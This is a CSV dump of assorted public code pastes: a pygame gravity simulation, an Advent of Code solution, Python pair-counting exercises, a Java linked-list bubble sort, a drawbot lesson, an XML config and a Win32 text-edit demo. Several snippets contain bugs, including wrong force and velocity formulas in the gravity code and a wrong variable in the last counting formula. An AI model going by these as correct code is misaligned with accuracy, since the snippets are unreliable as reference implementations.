id,title,username,language,date,content
z0bYrREM,pygame-law-of-universal-gravitation,Xnork,Python,Sunday 3rd of December 2023 10:21:58 AM CDT,"import pygame, math
from pygame.locals import *

SCALE = 10 ** -6.58
REAL_RADIUS_OF_EARTH = 6_371 * 10 ** 3
REAL_RADIUS_OF_SUN = 696_340 * 10 ** 3
G =  9.807

pygame.init()

display = pygame.display.set_mode((600, 600))
game_is_running = True
clock = pygame.time.Clock()

class Body:
  def __init__(self, position, radius = 50.0, density = 0.89) -> None:
    self.position = position
    self.radius = radius
    self.density = density
    self.mass = self.radius ** 2 * math.pi * self.density

    self.acceleration = [0, 0]
    self.velocity = [0, 0]

  def draw(self) -> None:
    pygame.draw.circle(display, (255, 255, 255), self.position, self.radius)

class LawOfUniversalGravitatoin:
  def __init__(self, body_a: Body, body_b: Body) -> None:
    self.body_a = body_a
    self.body_b = body_b

  def step(self) -> None:
    angle = math.atan2(self.body_b.position[1] - self.body_a.position[1], self.body_b.position[0] - self.body_a.position[0])
    magnitude = math.sqrt((self.body_b.position[0] - self.body_a.position[0]) ** 2 + (self.body_b.position[1] - self.body_a.position[1]) ** 2)

    F = G * (self.body_a.mass * self.body_b.mass) / magnitude

    self.body_a.acceleration[0] += math.cos(angle) * F / self.body_a.mass * SCALE
    self.body_a.velocity[0] = self.body_a.acceleration[0]
    self.body_a.acceleration[1] += math.sin(angle) * F / self.body_a.mass * SCALE
    self.body_a.velocity[1] = self.body_a.acceleration[1]
    self.body_a.position[1] += self.body_a.velocity[1]
    self.body_a.position[0] += self.body_a.velocity[0]

    self.body_b.acceleration[0] += math.cos(angle) * F / self.body_b.mass * SCALE
    self.body_b.velocity[0] = self.body_b.acceleration[1]
    self.body_b.acceleration[1] += math.sin(angle) * F / self.body_b.mass * SCALE
    self.body_b.velocity[1] = self.body_b.acceleration[1]
    self.body_b.position[1] += self.body_b.velocity[1]
    self.body_b.position[0] += self.body_b.velocity[0]

earth_body = Body([400, 100], REAL_RADIUS_OF_EARTH * SCALE)
earth_body.acceleration[0] = -0.5

sun_body = Body([400, 400], REAL_RADIUS_OF_SUN * SCALE)

law_of_universal_gravitation = LawOfUniversalGravitatoin(earth_body, sun_body)

while game_is_running:
  law_of_universal_gravitation.step()

  for event in pygame.event.get():
    if event.type == pygame.QUIT:
      game_is_running = False

  display.fill([20, 20, 20])  

  earth_body.draw()
  sun_body.draw()

  pygame.display.flip()
  clock.tick(120)

pygame.quit()"
innARbQy,Day 3 part 1,icarussiano,Python,Sunday 3rd of December 2023 09:54:48 AM CDT,"import re
with open(""input"") as file:
    data = file.read().splitlines()
num = []
sym = []
part1 = 0

for line in data:
    num.append([(int(m.group()),m.start(), m.end() - 1) for m in re.finditer(r'(\d+)', line)])
    sym.append([m.start() for m in re.finditer(r'[^\d.]', line)])

for i, x in enumerate(num):
    for n, s, e in x:
        if ((s - 1 in sym[i]) or (e + 1 in sym[i]) or
                (i != len(num) - 1 and any(x in sym[i + 1] for x in range(s - 1, e + 2))) or
                (i != 0 and any(x in sym[i - 1] for x in range(s - 1, e + 2)))):
            part1 += n

print(part1)"
JgS7KYyE,Untitled,Farz0l1x,Python,Sunday 3rd of December 2023 09:52:16 AM CDT,"from random import randint
A = [randint(1, 10000) for i in range(1000)]
Max = 0
for i in range(len(A)):
    for j in range(i + 11, len(A)):
        if (A[i] + A[j]) % 2 * 567 == 0:
            Max = max(Max, A[i] + A[j])
print(Max)"
V4atWuqi,Untitled,Farz0l1x,Python,Sunday 3rd of December 2023 09:42:36 AM CDT,"from random import randint
A = [randint(1, 10000) for i in range(1000)]
count = 0
for i in range(len(A)):
    for j in range(i + 8, len(A)):
        if abs(A[i] - A[j]) % 999 == 0:
            count += 1
print(count)"
XZyVv1cU,zadaca3labs5,cekozz,Java,Sunday 3rd of December 2023 09:41:02 AM CDT,"import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

class Node {
    int element;
    Node pred, succ;

    Node(int element) {
        this.element = element;
        this.pred = this.succ = null;
    }
}

public class BubbleSortDLL {

    Node begin;

    BubbleSortDLL() {
        this.begin = null;
    }


    void insert(int elem) {
        Node newNode = new Node(elem);
        if (begin == null) {
            begin = newNode;
        } else {
            Node temp = begin;
            while (temp.succ != null) {
                temp = temp.succ;
            }
            temp.succ = newNode;
            newNode.pred = temp;
        }
    }

    void bubbleSort() {
        if (begin == null || begin.succ == null) {

            return;
        }

        boolean swapped;
        Node last = null;

        do {
            swapped = false;
            Node current = begin;

            while (current.succ != last) {
                if (current.element > current.succ.element) {
                    swap(current, current.succ);
                    swapped = true;
                }
                current = current.succ;
            }

            last = current;
        } while (swapped);
    }


    void swap(Node node1, Node node2) {
        int temp = node1.element;
        node1.element = node2.element;
        node2.element = temp;
    }

    
    void printDLL() {
        Node temp = begin;
        while (temp != null) {
            System.out.print(temp.element + "" "");
            temp = temp.succ;
        }
        System.out.println();
    }

    public static void main(String[] args) throws IOException {
        BufferedReader br = new BufferedReader(new InputStreamReader(System.in));

        int n = Integer.parseInt(br.readLine());
        String[] nodes = br.readLine().split("" "");

        BubbleSortDLL list = new BubbleSortDLL();
        for (String node : nodes) {
            list.insert(Integer.parseInt(node));
        }

        list.bubbleSort();
        list.printDLL();
    }
}
"
QMM7fUp6,drawbot_Задание2,annstasi,Python,Sunday 3rd of December 2023 09:36:28 AM CDT,"from drawbot_skia.drawbot import *

# зададим правила для выбора
# фигуры, которые будем позже
# использовать:
rules = [1, 0, 1, 0, 2, 0, 1, ""гусь"", 3, 3] * 20
# список * 20
w, h = 742.5, 1050
newPage(w, h)

# определим поля и начальные
# координаты
margin = 80
x = margin
y = h - margin

# шаг = (ширина страницы - 2  поля (правое и левое)) / на 6 (6 фигур в строке)
step = (w - margin * 2) / 6

# создадим переменную size,
# равную выбранному шагу
size = step

for rule in rules:
    fill(0)
    stroke(None)
    # круг
    if rule == 0:
        oval(x, y - step, size, size)
    # квадрат
    elif rule == 1:
        rect(x, y - step, size, size)
    # окружность
    elif rule == 2:
        fill(None)
        stroke(0, 0, 0)
        strokeWidth(3)
        oval(x, y - step, size, size)
    # квадрат с красной рамкой
    elif rule == 3:
        fill(None)
        stroke(1, 0, 0)
        strokeWidth(3)
        rect(x, y - step, size, size)
    else:
        print(rule, ""<— неизвестное правило"")

    # сдвинем x на шаг
    x += step

    # если строка кончилась,
    # вернём x в начало, а
    # y сдвинем вниз на шаг
    if x >= w - margin:
        x = margin
        y -= step

    # если y дошёл до низа
    # страницы, создадим новую и
    # обнулим координаты
    if y - step < margin:
        newPage(w, h)
        x = margin
        y = h - margin

# сохраним pdf
saveImage(""summary_2_example.pdf"")


#############
# задание 1 #
#############

# перепишите последний пример
# так, чтобы в нём появилась
# обработка правила ""2"",
# рисующая контурный круг


##########################
# задание 2              #
# творческое, свободное  #
##########################

# можете использовать результат
# задания 1 как основу, или
# попробовать написать что-то
# новое
"
6WqXAAVE,vers,davidramos1,XML,Sunday 3rd of December 2023 09:30:33 AM CDT,"<?xml version=""1.0"" ?>
<launcher>
    <clientversion>1</clientversion>
	<clientsize>1000</clientsize>
    <clientname>Opostron</clientname>
</launcher>"
TDeLqf84,Untitled,Farz0l1x,Python,Sunday 3rd of December 2023 09:25:21 AM CDT,"from random import randint
A = [randint(1, 10000) for i in range(1000)]
Max  = -10**9
for i in range(len(A)):
    for j in range(i + 1, len(A)):
        if (A[i] * A[j]) % 350 == 0 and A[i] > A[j]:
            Max = max(Max, A[i] * A[j])
print(Max)"
1Z3q70z0,Untitled,Farz0l1x,Python,Sunday 3rd of December 2023 09:19:58 AM CDT,"from random import randint
A = [randint(1, 10000) for i in range(1000)]
Min  = 10**10
for i in range(len(A)):
    for j in range(i + 1, len(A)):
        if A[i] % 17 == 0 or A[j] % 17 == 0:
            Min = min(Min, A[i] + A[j])
print(Min)

a17 = []
a = []
for i in range(len(A)):
    if A[i] % 17 == 0:
        a17 += [A[i]]
    else:
        a += [A[i]]
a.sort()
a17.sort()
print(min(a17[0] + a[0], a17[0] + a17[1]))"
KRPSTRFE,wm_char,Delfigamer,C++,Sunday 3rd of December 2023 09:15:41 AM CDT,"#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS
#define _SCL_SECURE_NO_WARNINGS

#include <Windows.h>
#include <cstdio>
#include <utility>
#include <string>
#include <vector>

struct TextEdit {
    std::wstring buffer;
    int caret = 0;

    wchar_t const* Buffer() {
        return buffer.data();
    }

    int Length() {
        return buffer.size();
    }

    void NormalizeCaret() {
        if (caret < 0) {
            caret = 0;
        } else if (caret > Length()) {
            caret = buffer.size();
        }
    }

    void Insert(wchar_t ch) {
        NormalizeCaret();
        buffer.insert(caret, 1, ch);
        caret += 1;
    }

    void Insert(std::wstring const& str) {
        NormalizeCaret();
        if (!str.empty()) {
            buffer.insert(caret, str);
            caret += str.size();
        }
    }

    void EraseLeft() {
        NormalizeCaret();
        if (caret > 0) {
            buffer.erase(caret - 1, 1);
            caret -= 1;
        }
    }

    void EraseRight() {
        NormalizeCaret();
        if (caret < Length()) {
            buffer.erase(caret, 1);
        }
    }

    void MoveLeft() {
        if (caret > 0) {
            caret -= 1;
        }
    }

    void MoveRight() {
        if (caret < Length()) {
            caret += 1;
        }
    }

    void MoveHome() {
        caret = 0;
    }

    void MoveEnd() {
        caret = buffer.size();
    }
};

TextEdit Current;
HPEN CaretPen;

void WindowPaint(HWND hwnd) {
    RECT clientrect;
    GetClientRect(hwnd, &clientrect);
    SIZE wndsize = {clientrect.right - clientrect.left, clientrect.bottom - clientrect.top};

    PAINTSTRUCT ps;
    HDC wnddc = BeginPaint(hwnd, &ps);
    HBITMAP bitmap = CreateCompatibleBitmap(wnddc, wndsize.cx, wndsize.cy);
    HDC dc = CreateCompatibleDC(wnddc);
    SelectObject(dc, bitmap);

    RECT wndrect = {0, 0, wndsize.cx, wndsize.cy};
    HBRUSH brush = CreateSolidBrush(RGB(255, 255, 255));
    FillRect(dc, &wndrect, brush);

    TEXTMETRICW textmetric;
    GetTextMetricsW(dc, &textmetric);

    int currentx = textmetric.tmHeight;
    int currenty = textmetric.tmHeight;
    SIZE textsize;

    TextOutW(dc, currentx, currenty, Current.Buffer(), Current.Length());

    GetTextExtentPointW(dc, Current.Buffer(), Current.caret, &textsize);
    SelectObject(dc, CaretPen);
    MoveToEx(dc, currentx + textsize.cx, currenty, nullptr);
    LineTo(dc, currentx + textsize.cx, currenty + textmetric.tmHeight);

    BitBlt(wnddc, 0, 0, wndsize.cx, wndsize.cy, dc, 0, 0, SRCCOPY);
    DeleteObject(brush);
    DeleteDC(dc);
    DeleteObject(bitmap);
    EndPaint(hwnd, &ps);
}

LRESULT CALLBACK WindowProc(
    HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam
) {
    switch (uMsg) {
    case WM_CREATE:
        CaretPen = CreatePen(PS_SOLID, 0, RGB(0, 0, 0));
        return 0;
    case WM_DESTROY:
        DeleteObject(CaretPen);
        PostQuitMessage(0);
        return 0;
    case WM_CHAR:
        wprintf(L""WM_CHAR %#4llx'%lc' %3lli\n"", wParam, (wchar_t)wParam, (lParam >> 16) & 0xff);
        if (wParam == 8) {
            Current.EraseLeft();
        } else if (wParam >= 32) {
            Current.Insert(wParam);
        }
        InvalidateRect(hwnd, nullptr, false);
        return 0;
    case WM_KEYDOWN:
        wprintf(L""WM_KEYDOWN    %4lli %3lli\n"", wParam, (lParam >> 16) & 0xff);
        if (wParam == VK_LEFT) {
            Current.MoveLeft();
            InvalidateRect(hwnd, nullptr, false);
        } else if (wParam == VK_RIGHT) {
            Current.MoveRight();
            InvalidateRect(hwnd, nullptr, false);
        } else if (wParam == VK_HOME || wParam == VK_PRIOR || wParam == VK_UP) {
            Current.MoveHome();
            InvalidateRect(hwnd, nullptr, false);
        } else if (wParam == VK_END || wParam == VK_NEXT || wParam == VK_DOWN) {
            Current.MoveEnd();
            InvalidateRect(hwnd, nullptr, false);
        } else if (wParam == VK_DELETE) {
            Current.EraseRight();
            InvalidateRect(hwnd, nullptr, false);
        }
        return 0;
    case WM_KEYUP:
        return 0;
    case WM_PAINT:
        WindowPaint(hwnd);
        return 0;
    default:
        return DefWindowProcW(hwnd, uMsg, wParam, lParam);
    }
}

int CALLBACK WinMain(
    HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    AllocConsole();
    freopen(""CONOUT$"", ""w"", stdout);
    const DWORD WindowStyle = WS_OVERLAPPEDWINDOW;
    WNDCLASSW wndclass;
    wndclass.style = CS_VREDRAW | CS_HREDRAW;
    wndclass.lpfnWndProc = &WindowProc;
    wndclass.cbClsExtra = 8;
    wndclass.cbWndExtra = 0;
    wndclass.hInstance = hInstance;
    wndclass.hIcon = LoadIcon(0, IDI_APPLICATION);
    wndclass.hCursor = LoadCursor(0, IDC_ARROW);
    wndclass.hbrBackground = 0;
    wndclass.lpszMenuName = 0;
    wndclass.lpszClassName = L""MyWindowClass"";
    ATOM wndclassatom = RegisterClassW(&wndclass);
    RECT WindowRect = {0, 0, 800, 600};
    AdjustWindowRect(
        &WindowRect, WindowStyle, false);
    HWND hwnd = CreateWindowW(
        (LPCWSTR)wndclassatom,
        L""window"",
        WindowStyle,
        20,
        20,
        WindowRect.right - WindowRect.left,
        WindowRect.bottom - WindowRect.top,
        0,
        0,
        hInstance,
        0);
    ShowWindow(hwnd, SW_SHOW);
    UpdateWindow(hwnd);
    MSG message = {0, 0, 0, 0};
    while (GetMessageW(&message, nullptr, 0, 0)) {
        TranslateMessage(&message);
        DispatchMessageW(&message);
    }
    return 0;
};
"
jTXqd4FW,Untitled,Farz0l1x,Python,Sunday 3rd of December 2023 09:10:24 AM CDT,"from random import randint
A = [randint(1, 1000) for i in range(1000)]
Max = -10**9
for i in range(len(A)):
    for j in range(i + 1, len(A)):
        if (A[i] + A[j]) % 107 == 0:
            Max = max(Max, A[i] + A[j])
print(Max)

a = [[] for i in range(107)]
n = len(A)
for i in range(n):
    x = A[i]
    ost = x % 107
    a[ost] += [x]
b = []
for i in range(107):
    a[i].sort()
    b += a[i][-2:]
ans = []
for i in range(len(b)):
    for j in range(i + 1, len(b)):
        if (b[i] + b[j]) % 107 == 0:
            ans += [b[i] + b[j]]
print(max(ans))"
VcVCNGEV,Untitled,Farz0l1x,Python,Sunday 3rd of December 2023 08:58:31 AM CDT,"from random import randint
A = [randint(1, 1000) for i in range(1000)]
count = 0
for i in range(len(A)):
    for j in range(i + 1, len(A)):
        if (A[i] + A[j]) % 127 == 0:
            count += 1
print(count)

k = [0] * 127
n = len(A)
for i in range(n):
    ost = A[i] % 127
    k[ost] += 1
count = k[0] * (k[0] - 1) // 2
for i in range(1, 64):
    count += k[i] * k[127 - i]
print(count)"
aXrt8JGr,Untitled,Farz0l1x,Python,Sunday 3rd of December 2023 08:46:48 AM CDT,"from random import randint
A = [randint(1, 1000) for i in range(1000)]
count = 0
for i in range(len(A)):
    for j in range(i + 1, len(A)):
        if (A[i] * A[j]) % 15 == 0:
            count += 1
print(count)

k15 = 0
k5 = 0
k3 = 0
for i in range(len(A)):
    if A[i] % 15 == 0:
        k15 += 1
    elif A[i] % 5 == 0:
        k5 += 1
    elif A[i] % 3 == 0:
        k3 += 1
k = len(A) - k15
print(k * k15 + k3 * k5 + k15 * (k15 - 1) // 2)"
U6jgcWfs,Untitled,Farz0l1x,Python,Sunday 3rd of December 2023 08:38:41 AM CDT,"from random import randint
A = [randint(1, 100) for i in range(100)]
count = 0
for i in range(len(A)):
    for j in range(i + 1, len(A)):
        if (A[i] * A[j]) % 7 == 0:
            count += 1
print(count)

k7 = 0
for i in range(len(A)):
    if A[i] % 7 == 0:
        k7 += 1
k = len(A) - 7
print(k * k7 + k7 * (k7 - 1) // 2)"
